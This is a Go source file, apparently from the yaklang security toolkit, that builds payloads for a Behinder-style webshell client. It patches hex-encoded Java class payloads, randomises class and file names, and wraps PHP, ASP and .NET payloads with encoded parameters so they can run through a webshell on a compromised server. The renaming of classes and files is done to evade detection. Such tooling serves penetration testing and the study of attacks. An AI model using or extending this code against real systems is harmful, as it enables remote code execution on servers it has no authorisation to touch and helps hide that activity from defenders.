package behinder

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"github.com/yaklang/yaklang/common/javaclassparser"
	"github.com/yaklang/yaklang/common/log"
	"github.com/yaklang/yaklang/common/utils"
	"github.com/yaklang/yaklang/common/wsm/payloads"
	"regexp"
	"strconv"
	"strings"
)

type ParamItem struct {
	Key   string
	Value string
}

type Params struct {
	ParamItem []*ParamItem
}

type ParamsConfig func(p *Params)

func SetCommandPath(path string) ParamsConfig {
	return func(p *Params) {
		p.ParamItem = append(p.ParamItem, &ParamItem{
			Key:   "path",
			Value: path,
		})
	}
}

// SetNotEncrypt WebShell 返回的结果是否加密
func SetNotEncrypt() ParamsConfig {
	return func(p *Params) {
		p.ParamItem = append(p.ParamItem, &ParamItem{
			Key:   "notEncrypt",
			Value: "false",
		})
	}
}

// SetPrintMode https://www.cnblogs.com/qingmuchuanqi48/p/12079415.html
func SetPrintMode() ParamsConfig {
	return func(p *Params) {
		p.ParamItem = append(p.ParamItem, &ParamItem{
			Key:   "forcePrint",
			Value: "false",
		})
	}
}

func ProcessParams(params map[string]string, opts ...ParamsConfig) map[string]string {
	paramsEx := &Params{}
	for _, opt := range opts {
		opt(paramsEx)
	}

	for _, item := range paramsEx.ParamItem {
		if _, ok := params[item.Key]; ok {
			params[item.Key] = item.Value
		}
		if item.Key == "notEncrypt" {
			params["notEncrypt"] = item.Value
		}
		if item.Key == "forcePrint" {
			params["forcePrint"] = item.Value
		}
	}

	return params
}

func GetRawClass(binPayload string, params map[string]string) ([]byte, error) {
	b, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	clsObj, err := javaclassparser.Parse(b)
	if err != nil {
		return nil, err
	}
	for k, v := range params {
		fields := clsObj.FindConstStringFromPool(k)
		log.Info(fields)
		fields.Value = v
	}
	// 随机更换类名 原始类名是这样的 net/behinder/payload/java/xxx
	err = clsObj.SetClassName(payloads.RandomClassName())
	if err != nil {
		return nil, err
	}
	// 随机更换 文件名
	err = clsObj.SetSourceFileName(utils.RandNumberStringBytes(6))
	if err != nil {
		return nil, err
	}
	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行,不知道有没有 bug
	clsObj.MajorVersion = 49
	return clsObj.Bytes(), nil
}

func GetRawPHP(binPayload string, params map[string]string) ([]byte, error) {
	var code strings.Builder
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	code.WriteString(string(payloadBytes))
	paraList := ""
	paramsList := getPhpParams(payloadBytes)
	for _, paraName := range paramsList {
		if inStrSlice(keySet(params), paraName) {
			paraValue := params[paraName]
			paraValue = base64.StdEncoding.EncodeToString([]byte(paraValue))
			code.WriteString(fmt.Sprintf("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName))
			paraList = paraList + ",$" + paraName
		} else {
			code.WriteString(fmt.Sprintf("$%s=\"%s\";", paraName, ""))
			paraList = paraList + ",$" + paraName
		}
	}

	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain(" + paraList + ");")
	return []byte(code.String()), nil
}

// 判断字符串是否在数组中
func inStrSlice(array []string, str string) bool {
	for _, e := range array {
		if e == str {
			return true
		}
	}
	return false
}

func keySet(m map[string]string) []string {
	j := 0
	keys := make([]string, len(m))
	for k := range m {
		keys[j] = k
		j++
	}
	return keys
}

// 获取 php 代码中需要更改的 params
func getPhpParams(phpPayload []byte) []string {
	paramList := make([]string, 0, 2)
	mainRegex := regexp.MustCompile(`main\s*\([^)]*\)`)
	mainMatch := mainRegex.Match(phpPayload)
	mainStr := mainRegex.FindStringSubmatch(string(phpPayload))

	if mainMatch && len(mainStr) > 0 {
		paramRegex := regexp.MustCompile(`\$([a-zA-Z]*)`)
		//paramMatch := paramRegex.FindStringSubmatch(mainStr[0])
		paramMatch := paramRegex.FindAllStringSubmatch(mainStr[0], -1)
		if len(paramMatch) > 0 {
			for _, v := range paramMatch {
				paramList = append(paramList, v[1])
			}
		}
	}

	return paramList
}

func GetRawAssembly(binPayload string, params map[string]string) ([]byte, error) {
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	if len(keySet(params)) == 0 {
		return payloadBytes, nil
	} else {
		paramsStr := ""
		var paramName, paramValue string
		for key := range params {
			paramName = key
			paramValue = base64.StdEncoding.EncodeToString([]byte(params[paramName]))
			paramsStr = paramsStr + paramName + ":" + paramValue + ","
		}
		paramsStr = paramsStr[0 : len(paramsStr)-1]
		token := "~~~~~~" + paramsStr
		return append(payloadBytes, []byte(token)...), nil
	}
}

func GetRawASP(binPayload string, params map[string]string) ([]byte, error) {
	payloadBytes, err := hex.DecodeString(binPayload)
	if err != nil {
		return nil, err
	}
	var code strings.Builder
	code.WriteString(string(payloadBytes))
	paraList := ""
	if len(params) > 0 {
		paraList = paraList + "Array("
		for _, paramValue := range params {
			var paraValueEncoded string
			for _, v := range paramValue {
				//fmt.Println(v)
				paraValueEncoded = paraValueEncoded + "chrw(" + strconv.Itoa(int(v)) + ")&"
				//fmt.Println(paraValueEncoded)
			}
			paraValueEncoded = strings.TrimRight(paraValueEncoded, "&")
			paraList = paraList + "," + paraValueEncoded
		}
		paraList = paraList + ")"
	}
	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain " + paraList + "")
	return []byte(code.String()), nil
}
